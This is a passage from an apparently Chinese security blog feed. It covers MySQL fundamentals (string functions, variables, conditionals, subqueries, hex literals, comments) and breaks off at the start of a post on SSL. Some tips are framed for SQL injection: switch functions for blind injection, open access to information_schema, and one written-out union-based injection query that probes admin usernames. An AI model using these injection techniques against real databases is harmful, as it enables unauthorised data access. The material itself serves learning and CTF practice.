SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |+--------------+--------------------+----------------------------+------------------------+----------+| def          | information_schema | utf8                       | utf8_general_ci        | NULL     || def          | ctf                | utf8                       | utf8_general_ci        | NULL     || def          | employees          | utf8                       | utf8_general_ci        | NULL     || def          | mysql              | utf8                       | utf8_general_ci        | NULL     || def          | performance_schema | utf8                       | utf8_general_ci        | NULL     || def          | test               | latin1                     | latin1_swedish_ci      | NULL     || def          | world              | utf8                       | utf8_general_ci        | NULL     |+--------------+--------------------+----------------------------+------------------------+----------+7 rows in set (0.00 sec)</code></pre><p>我们来看看这个数据库中有哪些表，它们分别对应着什么数据</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%802.png" alt="此处输入图片的描述"></p><blockquote><p>还要补充的一点是，information_schema 数据表对所有用户开放而无视权限</p></blockquote><h2 id="0X02-解决方案"><a href="#0X02-解决方案" class="headerlink" title="0X02 解决方案"></a><strong>0X02 解决方案</strong></h2><h3 id="这一小节主要介绍的是一些一些实用的函数或者技巧"><a href="#这一小节主要介绍的是一些一些实用的函数或者技巧" class="headerlink" title="这一小节主要介绍的是一些一些实用的函数或者技巧"></a><strong>这一小节主要介绍的是一些一些实用的函数或者技巧</strong></h3><h3 id="1-字符串操作"><a href="#1-字符串操作" class="headerlink" title="1.字符串操作"></a><strong>1.字符串操作</strong></h3><h4 id="1-合并字符串"><a href="#1-合并字符串" class="headerlink" title="(1)合并字符串"></a><strong>(1)合并字符串</strong></h4><pre><code class="hljs">concat(str1,str,str3...);concat_ws(separator ,str1 ,str2 ,…);</code></pre><h4 id="2-截取字符串"><a href="#2-截取字符串" class="headerlink" title="(2)截取字符串"></a><strong>(2)截取字符串</strong></h4><h5 id="1-substring-str-pos-n-substr-str-pos-n-mid-str-pos-n"><a href="#1-substring-str-pos-n-substr-str-pos-n-mid-str-pos-n" class="headerlink" title="1.substring(str,pos,n);&#x2F;substr(str,pos,n);&#x2F;mid(str,pos,n);"></a><strong>1.substring(str,pos,n);&#x2F;substr(str,pos,n);&#x2F;mid(str,pos,n);</strong></h5><pre><code class="hljs">mysql&gt; select substring(&#39;www.baidu.com&#39;,&#39;5&#39;,5);+----------------------------------+| substring(&#39;www.baidu.com&#39;,&#39;5&#39;,5) |+----------------------------------+| baidu                            |+----------------------------------+1 row in set (0.00 sec)</code></pre><blockquote><p><strong>注意：</strong><br>(1)这里的 pos 是从 1 开始的，而不是从 0；<br>(2)n 不写时表示取到字符串末尾</p></blockquote><h5 id="2-letf-str-len-返回从第一个字符开始的-len-个字符"><a href="#2-letf-str-len-返回从第一个字符开始的-len-个字符" class="headerlink" title="2.letf(str,len); 返回从第一个字符开始的 len 个字符"></a><strong>2.letf(str,len); 返回从第一个字符开始的 len 个字符</strong></h5><h5 id="3-right-str-len-返回从最后一个字符开始的len-个字符"><a href="#3-right-str-len-返回从最后一个字符开始的len-个字符" class="headerlink" title="3.right(str,len); 返回从最后一个字符开始的len 个字符"></a><strong>3.right(str,len); 返回从最后一个字符开始的len 个字符</strong></h5><h5 id="4-substring-index-str-delim-count"><a href="#4-substring-index-str-delim-count" class="headerlink" title="4.substring_index(str,delim,count);"></a><strong>4.substring_index(str,delim,count);</strong></h5><pre><code class="hljs">mysql&gt; select substring_index(&#39;www.baidu.com&#39;,&#39;.&#39;,1);+----------------------------------------+| substring_index(&#39;www.baidu.com&#39;,&#39;.&#39;,1) |+----------------------------------------+| www                                    |+----------------------------------------+1 row in set (0.00 sec)mysql&gt; select substring_index(&#39;www.baidu.com&#39;,&#39;.&#39;,2);+----------------------------------------+| substring_index(&#39;www.baidu.com&#39;,&#39;.&#39;,2) |+----------------------------------------+| www.baidu                              |+----------------------------------------+1 row in set (0.00 sec)mysql&gt; select substring_index(&#39;www.baidu.com&#39;,&#39;.&#39;,-2);+-----------------------------------------+| substring_index(&#39;www.baidu.com&#39;,&#39;.&#39;,-2) |+-----------------------------------------+| baidu.com                               |+-----------------------------------------+1 row in set (0.10 sec)    </code></pre><h4 id="3-计算字符串长度"><a href="#3-计算字符串长度" class="headerlink" title="(3)计算字符串长度"></a><strong>(3)计算字符串长度</strong></h4><p>char_length()&#x2F;character_length() 和 length()&#x2F;octet_length() </p><blockquote><p><strong>注意：</strong> char_length()&#x2F;character_length() 计算的是字符的个数，而length()&#x2F;octet_length()  计算的是字节的长度</p></blockquote><p>但是我在测试的时候发现即使使用中文两者的结果还是一样的，都是按照字节去计算的，可能需要进一步考证</p><pre><code class="hljs">mysql&gt; select LENGTH(&#39;你好&#39;);+----------------+| LENGTH(&#39;你好&#39;)     |+----------------+|              4 |+----------------+1 row in set, 1 warning (0.00 sec)mysql&gt; select CHAR_LENGTH(&#39;你好&#39;);+---------------------+| CHAR_LENGTH(&#39;你好&#39;)     |+---------------------+|                   4 |+---------------------+1 row in set, 1 warning (0.00 sec)</code></pre><h4 id="4-改变存储的字符串"><a href="#4-改变存储的字符串" class="headerlink" title="(4)改变存储的字符串"></a><strong>(4)改变存储的字符串</strong></h4><p>将 colname 列的双引号换成单引号</p><pre><code class="hljs">replace(colname,&#39;&quot;&#39;,&#39;\&#39;&#39;);</code></pre><h4 id="5-判断子字符串在字符串中出现的位置"><a href="#5-判断子字符串在字符串中出现的位置" class="headerlink" title="(5)判断子字符串在字符串中出现的位置"></a><strong>(5)判断子字符串在字符串中出现的位置</strong></h4><h5 id="1-locate"><a href="#1-locate" class="headerlink" title="1.locate()"></a><strong>1.locate()</strong></h5><p>返回子串 substr 在字符串 str 中第一次出现的位置。如果子串 substr 在 str 中不存在，返回值为 0： </p><pre><code class="hljs">LOCATE(substr,str);</code></pre><p><strong>例如：</strong></p><pre><code class="hljs">mysql&gt; SELECT LOCATE(&#39;bar&#39;, ‘foobarbar&#39;); -&gt; 4 mysql&gt; SELECT LOCATE(&#39;xbar&#39;, ‘foobar&#39;); -&gt; 0 </code></pre><p>返回子串 substr 在字符串 str 中的第 pos 位置后第一次出现的位置。如果 substr 不在 str 中返回 0 ：</p><pre><code class="hljs">LOCATE(substr,str,pos) </code></pre><p><strong>例如：</strong></p><pre><code class="hljs">mysql&gt; SELECT LOCATE(&#39;bar&#39;, ‘foobarbar&#39;,5); -&gt; 7 </code></pre><h5 id="2-instr"><a href="#2-instr" class="headerlink" title="2.instr()"></a><strong>2.instr()</strong></h5><p>在一个字符串 str 中搜索指定的字符 substr,返回其第一次出现的位置 index ，其中 index 从 1 开始，如果不存在返回 0 ；</p><pre><code class="hljs">instr(str,substr);</code></pre><p><strong>例如：</strong></p><pre><code class="hljs">instr(&#39;123&#39;, &#39;12&#39;);-&gt;1  instr(&#39;123&#39;, &#39;23&#39;);-&gt;2</code></pre><h5 id="3-position"><a href="#3-position" class="headerlink" title="3.position()"></a><strong>3.position()</strong></h5><p>是 locate() 的别名，用法完全一样</p><h5 id="4-find-in-set"><a href="#4-find-in-set" class="headerlink" title="4.find_in_set()"></a><strong>4.find_in_set()</strong></h5><pre><code class="hljs">FIND_IN_SET(str,strlist)</code></pre><ol><li><p>假如字符串str在由N子链组成的字符串列表strlist中，则返回值的范围在1到N之间。</p></li><li><p>一个字符串列表就是一个由一些被‘,’符号分开的自链组成的字符串。</p></li><li><p>如果第一个参数是一个常数字符串，而第二个是typeSET列，则FIND_IN_SET()函数被优化，使用比特计算。</p></li><li><p>如果str不在strlist或strlist为空字符串，则返回值为0。</p></li><li><p>如任意一个参数为NULL，则返回值为NULL。这个函数在第一个参数包含一个逗号(‘,’)时将无法正常运行。</p></li></ol><blockquote><p>**注：**strlist：一个由英文逗号“,”链接的字符串，例如：”a,b,c,d”，该字符串形式上类似于SET类型的值被逗号给链接起来。</p></blockquote><p><strong>例如：</strong></p><pre><code class="hljs">SELECT FIND_IN_SET(&#39;b&#39;,&#39;a,b,c,d&#39;); //返回值为2，即第2个值</code></pre><h4 id="6-正则匹配"><a href="#6-正则匹配" class="headerlink" title="(6)正则匹配"></a><strong>(6)正则匹配</strong></h4><h5 id="1-like"><a href="#1-like" class="headerlink" title="1.like"></a><strong>1.like</strong></h5><p>like 常用通配符：% 、_ 、escape</p><pre><code class="hljs">% : 匹配0个或任意多个字符_ : 匹配任意一个字符escape ： 转义字符，可匹配%和_。如SELECT * FROM table_name WHERE column_name LIKE &#39;/%/_%_&#39; ESCAPE&#39;/&#39;</code></pre><h5 id="2-regexp-rlike"><a href="#2-regexp-rlike" class="headerlink" title="2.regexp&#x2F;rlike"></a><strong>2.regexp&#x2F;rlike</strong></h5><p>rlike和regexp:常用通配符：. 、* 、 [] 、 ^ 、 $ 、{n}</p><pre><code class="hljs">. : 匹配任意单个字符* ： 匹配0个或多个前一个得到的字符[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。^ : 匹配开头，如^s匹配以s或者S开头的字符串。$ : 匹配结尾，如s$匹配以s结尾的字符串。&#123;n&#125; : 匹配前一个字符反复n次。</code></pre><blockquote><p><strong>注意：</strong></p><p>(1)rlike 和 regexp 并不是完全匹配，而是只要模板匹配字符串的一部分就可以了，但是 like 是完全匹配<br>(2) Like 和 rlike 和 regexp 都是不区分大小写的</p></blockquote><h5 id="3-字符串的二进制比较"><a href="#3-字符串的二进制比较" class="headerlink" title="3.字符串的二进制比较"></a><strong>3.字符串的二进制比较</strong></h5><p>我们想要区分大小写就要通过这种二进制比较的方式</p><pre><code class="hljs">mysql&gt; select &quot;A&quot; = &quot;a&quot;;+-----------+| &quot;A&quot; = &quot;a&quot; |+-----------+|         1 |+-----------+1 row in set (0.00 sec)mysql&gt; select &quot;A&quot; = BINARY &quot;a&quot;;+------------------+| &quot;A&quot; = BINARY &quot;a&quot; |+------------------+|                0 |+------------------+1 row in set (0.10 sec)</code></pre><h4 id="7-自定义排序"><a href="#7-自定义排序" class="headerlink" title="(7)自定义排序"></a><strong>(7)自定义排序</strong></h4><h5 id="1-elt"><a href="#1-elt" class="headerlink" title="1.elt()"></a><strong>1.elt()</strong></h5><pre><code class="hljs">ELT(N ,str1 ,str2 ,str3 ,…)</code></pre><p>函数使用说明：若 N &#x3D; 1 ，则返回值为 str1 ，若 N &#x3D; 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL 。 ELT() 是 FIELD() 的补数</p><pre><code class="hljs">mysql&gt; SELECT ELT(3,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;);+--------------------------------------+| ELT(3,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;) |+--------------------------------------+| test                                 |+--------------------------------------+1 row in set</code></pre><p>盲注中我们可以这样将其作为开关</p><pre><code class="hljs">mysql&gt; select ELT(1,1);+----------+| ELT(1,1) |+----------+| 1        |+----------+1 row in set (0.00 sec)mysql&gt; select ELT(1,0);+----------+| ELT(1,0) |+----------+| 0        |+----------+1 row in set (0.00 sec)</code></pre><h5 id="2-field"><a href="#2-field" class="headerlink" title="2.field()"></a><strong>2.field()</strong></h5><pre><code class="hljs">FIELD(str, str1, str2, str3, ……)</code></pre><p>order by field（str，str1，str2，str3，str4……），str与str1，str2，str3，str4比较，其中str指的是字段名字，</p><p>意为：字段str按照字符串str1，str2，str3，str4的顺序返回查询到的结果集。如果表中str字段值不存在于str1，str2，str3，str4中的记录，放在结果集最前面返回。</p><p><strong>假如说表是这样的：</strong></p><pre><code class="hljs">root@localhost|iris&gt;select * from ta;+----+--------+------+-------+| id | name   | age  | class |+----+--------+------+-------+|  1 | iris   |   11 | a1    ||  2 | iris   |   22 | a2    ||  3 | seiki  |   33 | a3    ||  4 | seiki  |   44 | a4    ||  5 | xuding |   55 | a5    ||  6 | xut    |   66 | a6    ||  7 | iris   |   12 | a2    ||  8 | iris   |   24 | a4    ||  9 | seiki  |   36 | a6    || 10 | seiki  |   48 | a8    || 11 | xuding |   50 | a0    || 12 | xut    |   77 | a7    |+----+--------+------+-------+12 rows in set (0.00 sec)</code></pre><p><strong>按照’seiki’,’iris’,’xut’来排序，结果如下：</strong></p><pre><code class="hljs">root@localhost|iris&gt;select * from ta order by field(name,&#39;seiki&#39;,&#39;iris&#39;,&#39;xut&#39;);+----+--------+------+-------+| id | name   | age  | class |+----+--------+------+-------+#不在str1，str2，str3中的内容，放在最前面返回，str值相同按照主键的顺序|  5 | xuding |   55 | a5    || 11 | xuding |   50 | a0    ||  3 | seiki  |   33 | a3    ||  4 | seiki  |   44 | a4    ||  9 | seiki  |   36 | a6    || 10 | seiki  |   48 | a8    ||  1 | iris   |   11 | a1    ||  2 | iris   |   22 | a2    ||  7 | iris   |   12 | a2    ||  8 | iris   |   24 | a4    ||  6 | xut    |   66 | a6    || 12 | xut    |   77 | a7    |+----+--------+------+-------+12 rows in set (0.00 sec)</code></pre><p>当然这是正常的用法，但是其实还可以这样理解，这个函数返回的是str 在后面这些字符串中的索引</p><pre><code class="hljs">mysql&gt; SELECT FIELD(&#39;halo&#39;,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;);+---------------------------------------------+| FIELD(&#39;halo&#39;,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;) |+---------------------------------------------+|                                           2 |+---------------------------------------------+1 row in set</code></pre><p>其实我们还可以把这个函数看成是一个开关，或许在盲注的时候能代替 if ，例如下面这样</p><pre><code class="hljs">mysql&gt; select FIELD(1,0);+------------+| FIELD(1,0) |+------------+|          0 |+------------+1 row in set (0.00 sec)mysql&gt; select FIELD(1,1);+------------+| FIELD(1,1) |+------------+|          1 |+------------+1 row in set (0.00 sec)</code></pre><p>这里的第二个参数决定了这条语句的执行结果，和 if 还是比较类似的，有时候出现 NULL 的时候还可以配合 isnull() 这个函数将其转换成 布尔值，这里提一下，说不定也能用的到。</p><h3 id="2-变量与条件表达式"><a href="#2-变量与条件表达式" class="headerlink" title="2.变量与条件表达式"></a><strong>2.变量与条件表达式</strong></h3><h4 id="1-变量"><a href="#1-变量" class="headerlink" title="(1)变量"></a><strong>(1)变量</strong></h4><p>mysql 5.0 以后开始支持存储过程，变量是存储过程中比较重要的元素，MySQL 的变量分为三个类型</p><h5 id="1-变量类型："><a href="#1-变量类型：" class="headerlink" title="1.变量类型："></a><strong>1.变量类型：</strong></h5><p><strong>1.普通变量:</strong> 以@开头，在 sql 连接关闭时失去内容<br><strong>2.系统变量:</strong> 以@@开头，表示的是mysql 服务器的工作状态和属性，许多系统变量有两种形式，一种表示当前连接 @@session.wait_timeout,另一种表示mysql 服务器 @@global.wait_timeout</p><pre><code class="hljs">mysql&gt; select @@session.wait_timeout;+------------------------+| @@session.wait_timeout |+------------------------+|                  28800 |+------------------------+1 row in set (0.00 sec)mysql&gt; select @@global.wait_timeout;+-----------------------+| @@global.wait_timeout |+-----------------------+|                 28800 |+-----------------------+1 row in set (0.00 sec)</code></pre><p><strong>3.存储过程的局部变量:</strong> 没有特殊的标志，只在存储过程内有效</p><h5 id="2-变量赋值："><a href="#2-变量赋值：" class="headerlink" title="2.变量赋值："></a><strong>2.变量赋值：</strong></h5><p>变量赋值有两种方式</p><p>1.set 赋值的时候 使用 &#x3D;<br>2.select 赋值的时候使用 :&#x3D; 或者是 into</p><pre><code class="hljs">mysql&gt; set @varname = 3;Query OK, 0 rows affected (0.00 sec)mysql&gt; select @varname;+----------+| @varname |+----------+|        3 |+----------+1 row in set (0.00 sec)mysql&gt; select @varname := 4;+---------------+| @varname := 4 |+---------------+|             4 |+---------------+1 row in set (0.00 sec)mysql&gt; select @varname;+----------+| @varname |+----------+|        4 |+----------+1 row in set (0.00 sec)mysql&gt; select count(*) from bsqli into @varname;Query OK, 1 row affected (0.32 sec)mysql&gt; select @varname;+----------+| @varname |+----------+|        2 |+----------+1 row in set (0.00 sec)</code></pre><h5 id="2-变量赋值：-1"><a href="#2-变量赋值：-1" class="headerlink" title="2.变量赋值："></a><strong>2.变量赋值：</strong></h5><p>我们可以使用表达式给变量赋值，请看下面的实验</p><pre><code class="hljs">mysql&gt; select ID ,@rownum:=@rownum+1 as rownum from city order by ID limit 10;+----+--------+| ID | rownum |+----+--------+|  1 |     11 ||  2 |     12 ||  3 |     13 ||  4 |     14 ||  5 |     15 ||  6 |     16 ||  7 |     17 ||  8 |     18 ||  9 |     19 || 10 |     20 |+----+--------+10 rows in set (0.00 sec)</code></pre><p>这样就实现了逐个增加，是不是很神奇？我们再来看下面的测试</p><pre><code class="hljs">mysql&gt; select @b:=@b is not null;+--------------------+| @b:=@b is not null |+--------------------+|                  0 |+--------------------+1 row in set (0.00 sec)mysql&gt; select @b:=@b is not null;+--------------------+| @b:=@b is not null |+--------------------+|                  1 |+--------------------+1 row in set (0.00 sec)</code></pre><p>这个怎么理解呢？我们先来看赋值号后面的这个表达式 </p><pre><code class="hljs">@b is not null</code></pre><p>由于 @b 并没有在当前的会话中定义过，于是一开始是 null ，然后我们做了个判断，判断 @b 不是 null ,很明显这个得到的是假，也就是 0 ,那么再执行完这个语句之后 @b 就被赋值为 0 ，当第二次再执行的时候就是判断 0 不是 Null ,这次肯定是真，于是返回1 此时 @b 就被赋值为1</p><p> 这样就达到了在同一个会话中，相同的语句执行结果不同的效果，之前在 LCTF2018 中有一道题就是利用这种方式去做的，但是没人解出来。</p><h4 id="2-条件表达式"><a href="#2-条件表达式" class="headerlink" title="(2)条件表达式"></a><strong>(2)条件表达式</strong></h4><h5 id="1-if-condition-result1-result2"><a href="#1-if-condition-result1-result2" class="headerlink" title="1.if(condition,result1,result2);"></a><strong>1.if(condition,result1,result2);</strong></h5><p>当 condition 结果为真时返回 result1 否则返回 result2,这常常用作我们盲注的开关函数，</p><pre><code class="hljs">mysql&gt; select if(1,1,0);+-----------+| if(1,1,0) |+-----------+|         1 |+-----------+1 row in set (0.00 sec)mysql&gt; select if(0,1,0);+-----------+| if(0,1,0) |+-----------+|         0 |+-----------+1 row in set (0.00 sec)</code></pre><h5 id="2-case-…-when…then…else…end"><a href="#2-case-…-when…then…else…end" class="headerlink" title="2.case(…)when…then…else…end"></a><strong>2.case(…)when…then…else…end</strong></h5><p>case 有两种变体</p><p><strong>(1)case expr when val1 then result1 when val2 then result2 else result3 end;</strong></p><p>就是会判断 expr 的结果 ，根据结果是 val1 还是 val2 或者其他，来执行不同的语句</p><p><strong>(2)case when condition1 then result1 when condition2 result2 else result3 end;</strong></p><p>这种就是不判断值，直接根据不同情况进行选择</p><p>比如可以构造这样一条注入语句</p><pre><code class="hljs">select * from test where id =-1 union select 1,case when username like &#39;a%&#39; then 0 else 2222222222222222222 end,3,4 from tdb_admin</code></pre><h3 id="3-子查询"><a href="#3-子查询" class="headerlink" title="3.子查询"></a><strong>3.子查询</strong></h3><h4 id="1-模板一"><a href="#1-模板一" class="headerlink" title="(1)模板一"></a><strong>(1)模板一</strong></h4><pre><code class="hljs">select ... from ... where col = [any|all](select...);</code></pre><p>1.在这个变体里，子查询的返回结果必须是一个离散值（一行一列），用来和 col 进行比较操作，这里的比较操作符&#x3D;还可以是 &gt; &gt;&#x3D; &lt; &lt;&#x3D; &lt;&gt; </p><p>2.当前面有修饰符的时候，前面的修饰符可以是 any&#x2F;some（ 这两个同义）和 all，这时子查询可以返回多个值，col &#x3D; any… 等同于 col &#x3D; in … ,当前面的修饰符是 all 的时候只有两种情况能让 operator all 的返回结果为真，一种是在所有的值都能满足这个 operator 条件时，另一种是在 select 子查询没有任何返回结果时</p><h4 id="2-模板二"><a href="#2-模板二" class="headerlink" title="(2)模板二"></a><strong>(2)模板二</strong></h4><pre><code class="hljs">select ....from ... where col [not]in(select...);</code></pre><p>此时select 子查询的返回结果可以是一个离散值的列表</p><h4 id="3-模板三"><a href="#3-模板三" class="headerlink" title="(3)模板三"></a><strong>(3)模板三</strong></h4><pre><code class="hljs">select row(value1,valu2...) = [any/some](select col1,col2...);</code></pre><p>该语句查询数据表中师傅存在一条对应的记录，子查询返回的结果是一组离散值，但是当使用 any 或者其同义词 some 修饰的时候可以返回多组离散值，其中只要有一组满足条件结果则为真</p><h4 id="4-模板四"><a href="#4-模板四" class="headerlink" title="(4)模板四"></a><strong>(4)模板四</strong></h4><pre><code class="hljs">select ... from ...where col [not]exists(select...);</code></pre><h4 id="5-模板五"><a href="#5-模板五" class="headerlink" title="(5)模板五"></a><strong>(5)模板五</strong></h4><pre><code class="hljs">select ... from (select ...) as name where ...</code></pre><p>外层 select 查询的是内层 select 查询出来的临时表，MySQL 要求这种临时表必须通过 as name 的形式给予别名</p><blockquote><p><strong>注意:</strong> mysql 不允许在子查询中使用 limit ，limit 一定是在最外层并且最后运行的</p></blockquote><h4 id="6-补充"><a href="#6-补充" class="headerlink" title="(6)补充"></a><strong>(6)补充</strong></h4><p>当然除了上面这几种类别以外，子查询的位置还能放在 select 后面作为选择列，或者放在 order by 后面作为拍序列，但是在 sql 注入中子查询的缺点是不能回显，union 倒是可以，只要有回显位，但是现在能回显的越来越少了，一般都是盲注什么的。</p><h2 id="0X03-其他细节"><a href="#0X03-其他细节" class="headerlink" title="0X03 其他细节"></a><strong>0X03 其他细节</strong></h2><h3 id="1-命名规则："><a href="#1-命名规则：" class="headerlink" title="(1)命名规则："></a><strong>(1)命名规则：</strong></h3><p>数据库、数据表、数据字段等数据库对象的名字长度最多达到64字符，允许使用的字符是 MySQL 允许使用的字符集中的所有数字字母符号以及 _ 和 $</p><blockquote><p><strong>注意：</strong><br>(1)包含特殊字符和保留字的名字一般不被使用，但是还是可以通过添加 反引号的方式来使用，但是同样这样的字段是没法直接用命令行查询的，查询的时候也要带上反引号<br>(2)当使用不在该数据库的数据表的时候，要使用 数据库.数据表 的形式，同理，如果遇到不能区分的列，也要使用类似的方式进行区分</p></blockquote><h3 id="2-字符串"><a href="#2-字符串" class="headerlink" title="(2)字符串"></a><strong>(2)字符串</strong></h3><p>字符串可以用单引号包裹也可以用双引号，当出现引号里面还有引号的使用，必须使用不同的引号加以区分，或者使用反斜杠进行转义</p><p>MySQL 支持使用 16进制值表示对象</p><h3 id="3-数值"><a href="#3-数值" class="headerlink" title="(3)数值"></a><strong>(3)数值</strong></h3><p>1.MySQL 支持十进制使用小数点，并且可以使用 用e 表示的科学计数法表示很大或者很小的数值</p><p>2.MYSQL 支持使用 0x 或者 x’12121’ 表示16进制数据</p><pre><code class="hljs">mysql&gt; select 0x4142434445464748494a;+------------------------+| 0x4142434445464748494a |+------------------------+| ABCDEFGHIJ             |+------------------------+1 row in set (0.00 sec)mysql&gt; select x&#39;4142434445464748494a&#39;;+-------------------------+| x&#39;4142434445464748494a&#39; |+-------------------------+| ABCDEFGHIJ              |+-------------------------+1 row in set (0.00 sec)</code></pre><p>3.MySQL 支持进制之间的隐式转换，比如 16进制加一个十进制的数会变成十进制</p><pre><code class="hljs">mysql&gt; select 0x41;+------+| 0x41 |+------+| A    |+------+1 row in set (0.00 sec)mysql&gt; select 0x41+0;+--------+| 0x41+0 |+--------+|     65 |+--------+1 row in set (0.00 sec)</code></pre><p>4.MySQL 支持字符串和数值之间的转换，字符串在和数值运算时会将字符串转换成数值(开头部分是数值则转化成对应数值，如果不是数值则自动转化成0)</p><pre><code class="hljs">mysql&gt; select &quot;112.3456asdasd&quot;+1;+--------------------+| &quot;112.3456asdasd&quot;+1 |+--------------------+|           113.3456 |+--------------------+1 row in set, 1 warning (0.00 sec)</code></pre><p>5.MySQL 5.03 开始支持二进制数值，可以表示为 b’100110’ 的形式</p><h3 id="4-注释"><a href="#4-注释" class="headerlink" title="(4)注释"></a><strong>(4)注释</strong></h3><p>1.单行注释：# 和 – (后面有一个空格)<br>2.多行注释：&#x2F;**&#x2F;<br>3.内联注释：<code>/*!*/</code></p><h3 id="5-操作符"><a href="#5-操作符" class="headerlink" title="(5)操作符"></a><strong>(5)操作符</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%803.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%804.png" alt="此处输入图片的描述"></p><blockquote><p>**注意：**逻辑与的优先级要高于逻辑或</p></blockquote><h3 id="6-一些函数"><a href="#6-一些函数" class="headerlink" title="(6)一些函数"></a><strong>(6)一些函数</strong></h3><h4 id="1-比较、测试、分支"><a href="#1-比较、测试、分支" class="headerlink" title="1.比较、测试、分支"></a><strong>1.比较、测试、分支</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%805.png" alt="此处输入图片的描述"></p><h4 id="2-字符串处理"><a href="#2-字符串处理" class="headerlink" title="2.字符串处理"></a><strong>2.字符串处理</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%806.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%807.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%808.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%809.png" alt="此处输入图片的描述"></p><h4 id="3-统计函数-与-group-by-配合使用"><a href="#3-统计函数-与-group-by-配合使用" class="headerlink" title="3.统计函数(与 group by 配合使用)"></a><strong>3.统计函数(与 group by 配合使用)</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%8010.png" alt="此处输入图片的描述"></p><h4 id="4-算数函数"><a href="#4-算数函数" class="headerlink" title="4.算数函数"></a><strong>4.算数函数</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%8013.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%8014.png" alt="此处输入图片的描述"></p><h4 id="5-其他函数"><a href="#5-其他函数" class="headerlink" title="5.其他函数"></a><strong>5.其他函数</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%8011.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%8012.png" alt="此处输入图片的描述"></p><h4 id="6-mysql-运算符的优先级"><a href="#6-mysql-运算符的优先级" class="headerlink" title="6.mysql 运算符的优先级"></a><strong>6.mysql 运算符的优先级</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%8015.png" alt="此处输入图片的描述"></p><h2 id="0X04-总结"><a href="#0X04-总结" class="headerlink" title="0X04 总结"></a><strong>0X04 总结</strong></h2><p>因为最近心血来潮想写一点关于 SQL 的东西，中间一些知识点不想再过多介绍，于是就打算偷个小懒先把这篇老文章丢出来，到时候直接参考。</p><h2 id="0X05-参考链接"><a href="#0X05-参考链接" class="headerlink" title="0X05 参考链接"></a><strong>0X05 参考链接</strong></h2><p><a href="https://www.cnblogs.com/xiaoxi/p/5889486.html">https://www.cnblogs.com/xiaoxi/p/5889486.html</a><br><a href="https://www.cnblogs.com/tommy-huang/p/4483583.html">https://www.cnblogs.com/tommy-huang/p/4483583.html</a><br><a href="https://blog.csdn.net/dongganen/article/details/78580813">https://blog.csdn.net/dongganen/article/details/78580813</a><br><a href="https://www.cnblogs.com/xdans/p/5412468.html">https://www.cnblogs.com/xdans/p/5412468.html</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL 语法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对 SSL 技术的详细归纳</title>
    <link href="/2019/01/28/%E5%AF%B9%20SSL%20%E6%8A%80%E6%9C%AF%E7%9A%84%E8%AF%A6%E7%BB%86%E5%BD%92%E7%BA%B3/"/>
    <url>/2019/01/28/%E5%AF%B9%20SSL%20%E6%8A%80%E6%9C%AF%E7%9A%84%E8%AF%A6%E7%BB%86%E5%BD%92%E7%BA%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>从大一开始就读过网上的各种关于 SSL 分析的文章，但是由于知识水平的不到位，也只是似懂非懂的，能说个大概但是再细节一点就懵逼了，不过上学期学了密码学，学的时候我就特地的对有关这部分的内容重点关注了一下，想这次必须要彻底弄清楚了，并且 SSL 也是我们当前互联网的加密传输与通信的典范案例，弄清楚细节对日后的学习工作必有大的帮助。</p><p>SSL利用数据加密(<strong>对称密码</strong>)、身份验证(<strong>数字签名+PKI&#x2F;CA</strong>)和消息完整性验证机制(<strong>MAC</strong>)，为基于TCP等可靠连接的应用层协议提供安全性保证。本文会简单介绍SSL的产生背景、技术优点、安全机制及工作过程。</p><blockquote><p> <strong>注：</strong> PKI (Public Key Infrastructure 公钥基础设施）</p></blockquote><span id="more"></span><h2 id="0X01-产生背景"><a href="#0X01-产生背景" class="headerlink" title="0X01 产生背景"></a><strong>0X01 